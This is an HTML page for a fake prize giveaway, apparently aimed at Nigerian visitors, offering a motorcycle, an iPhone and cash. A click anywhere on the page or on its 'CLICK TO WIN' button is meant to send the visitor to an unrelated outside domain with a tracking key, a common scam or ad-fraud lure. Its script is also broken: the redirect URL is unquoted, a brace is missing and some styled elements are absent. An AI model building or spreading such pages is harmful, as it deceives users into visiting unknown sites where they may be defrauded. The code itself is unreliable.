<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Win Amazing Giveaway</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      background: linear-gradient(135deg, #008751, #ffffff, #008751);
      overflow-x: hidden;
      color: white;
      text-align: center;
      cursor: pointer;
    }

    .overlay {
      background: rgba(0, 0, 0, 0.6);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    h1 {
      font-size: 3rem;
      margin-bottom: 15px;
      color: #ffd700;
      text-shadow: 2px 2px 10px black;
      animation: pulse 1.5s infinite;
    }

    p {
      font-size: 1.2rem;
      margin-bottom: 25px;
      max-width: 700px;
      line-height: 1.6;
    }

    .image-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 20px;
      margin-bottom: 30px;
    }

    .image-container img {
      width: 280px;
      height: 200px;
      object-fit: cover;
      border-radius: 20px;
      border: 4px solid white;
      box-shadow: 0 0 20px rgba(255,255,255,0.6);
      transition: transform 0.3s ease;
    }

    .image-container img:hover {
      transform: scale(1.05);
    }

    .btn {
      background: #ff0000;
      color: white;
      padding: 20px 40px;
      font-size: 1.6rem;
      border: none;
      border-radius: 50px;
      font-weight: bold;
      box-shadow: 0 0 20px rgba(255,0,0,0.8);
      animation: bounce 1.2s infinite;
      cursor: pointer;
      text-decoration: none;
      display: inline-block;
    }

    .btn:hover {
      background: #cc0000;
      transform: scale(1.05);
    }

    .floating-text {
      position: absolute;
      font-size: 2rem;
      font-weight: bold;
      color: rgba(255,255,255,0.2);
      animation: float 10s linear infinite;
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.08); }
      100% { transform: scale(1); }
    }

    @keyframes bounce {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }

    @keyframes float {
      from {
        transform: translateY(100vh) rotate(0deg);
      }
      to {
        transform: translateY(-120vh) rotate(360deg);
      }
    }

    @media(max-width: 768px) {
      h1 {
        font-size: 2rem;
      }

      .btn {
        font-size: 1.2rem;
        padding: 15px 25px;
      }

      .image-container img {
        width: 100%;
        max-width: 320px;
      }
    }
  </style>
</head>
<body onclick="redirectNow()">

    <p>
      Stand a chance to win a brand new motorcycle, latest iPhone, and huge cash prizes today!

    </p>

    <div class="image-container">
      <img src="https://images.unsplash.com/photo-1558981806-ec527fa84c39?q=80&w=1200&auto=format&fit=crop" alt="Motorcycle">

      <img src="https://images.unsplash.com/photo-1592286927505-1def25115558?q=80&w=1200&auto=format&fit=crop" alt="Latest iPhone">

      <img src="https://images.unsplash.com/photo-1621263764928-df1444c5e859?q=80&w=1200&auto=format&fit=crop" alt="Money">
    </div>

    <a href="#" class="btn" onclick="redirectNow(event)">
      CLICK TO WIN GIVEAWAY NOW!
    </a>
  </div>

  <div class="floating-text" style="left:10%; animation-duration:12s;">₦₦₦</div>
  <div class="floating-text" style="left:40%; animation-duration:9s;">🎁</div>
  <div class="floating-text" style="left:70%; animation-duration:14s;">🏍️</div>
  <div class="floating-text" style="left:85%; animation-duration:11s;">📱</div>

  <script>

    function redirectNow(event) {
      if (event) {
        event.preventDefault();

      window.location.href = https://villagetraitgarret.com/m86z85zd61?key=ce12899efd68248dc3c02d8a16a504c3;
    }
  </script>

</body>
</html>
